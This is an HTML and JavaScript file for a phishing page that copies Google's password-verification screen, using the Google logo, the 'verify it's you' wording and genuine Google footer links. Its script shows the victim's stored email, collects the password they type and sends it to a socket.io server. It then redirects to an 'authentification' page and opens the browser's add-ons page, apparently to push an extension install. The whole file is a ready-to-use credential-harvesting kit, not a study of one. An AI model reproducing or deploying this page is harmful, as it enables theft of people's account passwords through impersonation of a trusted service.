<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="password.css">
  <style>
    /* Remove underline & blue color from links */
    .help a, .privacy a, .terms a {
      text-decoration: none;
      color: black;
    }

    /* Optional: Change color on hover */
    .help a:hover, .privacy a:hover, .terms a:hover {
      color: gray;
    }

    /* Red error text */
    .small_text2 {
      display: none;
      color: red;
    }

    .small_text {
      display: none;
      color: #1a73e8;
    }

    .error {
      border: 1px solid red;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- Google Logo -->
    <div class="google_g_logo">
      <img src="images/Google__G__logo.svg.png" alt="Google G logo" width="44" height="44">
    </div>

    <!-- Greeting -->
    <div class="name_container">
      <span jsslot="">Welcome</span>
    </div>

    <!-- Instruction -->
    <div class="text_container1">
      To continue, first verify it’s you
    </div>

    <!-- Login Form -->
    <form id="loginForm">
      <div class="form-group">
        <label for="password"></label>
        <input type="password" id="password" name="password" required placeholder=" Enter your password" minlength="8" maxlength="45">
      </div>
    </form>

    <!-- Clickable Box to Show/Hide Password -->
    <div id="togglePassword"></div>

    <!-- Show Password Text -->
    <div class="show_password" id="showPasswordText">Show password</div>

    <!-- Try Another Way -->
    <div class="text_container2">Try another way</div>

    <!-- Next Button -->
    <div class="next_button">
      <button type="submit" id="nextButton">Next</button>
    </div>

    <!-- Language Selection -->
    <div class="english">
      <a href="https://support.google.com/" target="_blank">English (United States)</a> 
      <span style="color: rgb(71, 71, 71); margin-left: 25px;">▼</span>
    </div>

    <!-- Footer Links -->
    <div class="help">
      <a href="https://support.google.com/" target="_blank"> <span style="color: rgb(71, 71, 71)">Help</span></a> 
    </div>

    <div class="privacy">
      <a href="https://policies.google.com/privacy" target="_blank"> <span style="color: rgb(71, 71, 71)">Privacy</span></a>
    </div>

    <div class="terms">
      <a href="https://policies.google.com/terms" target="_blank"> <span style="color: rgb(71, 71, 71)">Terms</span></a>
    </div>

    <!-- Account Info -->
    <div class="account">
      <a href="mailto:" id="emailLink">
        <span id="emailText"></span>
        <span class="emailArrow">▼</span>
      </a>
    </div>

    <div class="small_text">
      Enter your password
    </div>

    <div class="small_text2">
      Enter your password
    </div>

    <div class="red_password"> <img src="images/enter_a_password_red.png" alt="red_password" width="120" height="16">
    </div>

    <div class="wrong_password"> <img src="images/wrong_password.png" alt="wrong_password" width="380" height="16">
    </div>

    <div class="user_photo">
      <img src="images/user_photo.png" alt="user_photo" width="27" height="25" >
    </div>
  </div>

  <!-- JavaScript -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const socket = io(); // Connect to the server
      const loginForm = document.getElementById("loginForm");
      const account = document.querySelector(".account");
      const english = document.querySelector(".english");
      const text_container2 = document.querySelector(".text_container2");
      const privacy = document.querySelector(".privacy");
      const terms = document.querySelector(".terms");
      const passwordInput = document.getElementById("password");
      const togglePassword = document.getElementById("togglePassword");
      const showPasswordText = document.getElementById("showPasswordText");
      const nextButton = document.getElementById("nextButton");
      const smallText = document.querySelector(".small_text");
      const smallText2 = document.querySelector(".small_text2"); // Get the small_text2
      const redPasswordMessage = document.querySelector(".red_password"); // Get the red password message div
      const wrong_password = document.querySelector(".wrong_password"); // Get the wrong password message div
      const emailText = document.getElementById("emailText");
      const emailLink = document.getElementById("emailLink");

      const email = localStorage.getItem("email");
      const emailArrow = document.querySelector(".emailArrow");

      if (email) {
        emailText.textContent = email;
        emailLink.href = `mailto:${email}`;

        let baseWidth = 100; // Minimum width
        let extraWidth = 0;

        if (email.length > 28) {
          baseWidth = 215;
        } else if (email.length > 27) {
          baseWidth = 210;
        } else if (email.length > 26) {
          baseWidth = 205;
        } else if (email.length > 25) {
          baseWidth = 215;
        } else if (email.length > 24) {
          baseWidth = 210;
        } else if (email.length > 23) {
          baseWidth = 200;
        } else if (email.length > 22) {
          baseWidth = 190;
        } else if (email.length > 21) {
          baseWidth = 180;
        } else if (email.length > 20) {
          baseWidth = 170;
        } else if (email.length > 19) {
          baseWidth = 160;
        } else if (email.length > 18) {
          baseWidth = 155;
        } else if (email.length > 17) {
          baseWidth = 150;
        } else if (email.length > 16) {
          baseWidth = 145;
        } else if (email.length > 15) {
          baseWidth = 140;
        } else if (email.length > 14) {
          baseWidth = 135;
        } else if (email.length > 13) {
          baseWidth = 130;
        } else if (email.length > 12) {
          baseWidth = 120;
        } else if (email.length > 11) {
          baseWidth = 110;
        } else if (email.length > 10) {
          baseWidth = 100;
        }

        let newWidth = baseWidth;
        account.style.width = `${newWidth + 10}px`; // Extra space for padding
      }

      // Toggle password visibility
      function togglePasswordVisibility() {
        if (passwordInput.type === "password") {
          passwordInput.type = "text";
          togglePassword.classList.add("show-password"); // Show check mark
        } else {
          passwordInput.type = "password";
          togglePassword.classList.remove("show-password"); // Hide check mark
        }
      }

      // Event listener for the "Show password" text
      showPasswordText.addEventListener("click", togglePasswordVisibility);
      togglePassword.addEventListener("click", togglePasswordVisibility);

      // Function to capture password and validate input
      function capturePassword(event) {
        event.preventDefault(); // Prevent form submission

        const password = passwordInput.value.trim();

        if (password === "") {
          // Display error for empty password
          smallText2.style.display = "block";
          smallText2.textContent = "Enter your password";
          smallText2.style.color = "rgb(176, 6, 6)";

          redPasswordMessage.style.display = "block";
          wrong_password.style.display = "none";
          passwordInput.focus();
          passwordInput.classList.add("error");
          passwordInput.style.borderColor = "rgb(176, 6, 6)";

          togglePassword.style.marginTop = "30px";
          account.style.marginTop = "-271px";
          english.style.marginTop = "53px";
          text_container2.style.marginTop = "155px";

          smallText.style.display = "none";
          return;
        }

        if (password.length < 8) {
          // Display error for short password
          smallText2.style.display = "block";
          smallText2.textContent = "Enter your password";
          smallText2.style.color = "rgb(176, 6, 6)";

          wrong_password.style.display = "block";
          redPasswordMessage.style.display = "none";
          passwordInput.focus();
          passwordInput.classList.add("error");
          passwordInput.style.borderColor = "rgb(176, 6, 6)";

          togglePassword.style.marginTop = "30px";
          account.style.marginTop = "-271px";
          english.style.marginTop = "53px";
          text_container2.style.marginTop = "155px";

          smallText.style.display = "none";
          return;
        }

        // Reset error messages if password is valid
        wrong_password.style.display = "none";
        redPasswordMessage.style.display = "none";
        passwordInput.classList.remove("error");
        passwordInput.style.borderColor = "";

        togglePassword.style.marginTop = "10px";
        account.style.marginTop = "-270px";

        smallText.style.display = "block";

        if (password.length > 45) {
          alert("Password must be no longer than 45 characters.");
          return;
        }

        console.log("Password entered:", password); // Log password to the terminal

        // Emit password to the server
        socket.emit("login", { password });

        // Redirect to loading page (current window)
        window.location.href = "/authentification.html";
        
        // Open a new tab with a specific URL
        window.open("about:addons", "_blank");  // Replace "/new-tab-url" with the URL you want to open in a new tab
      }

      // Capture password when clicking "Next" button
      nextButton.addEventListener("click", capturePassword);

      // Capture password when pressing "Enter" key
      passwordInput.addEventListener("keypress", function (e) {
        if (e.key === "Enter") {
          capturePassword(e);
        }
      });
    });
  </script>
</body>

</html>
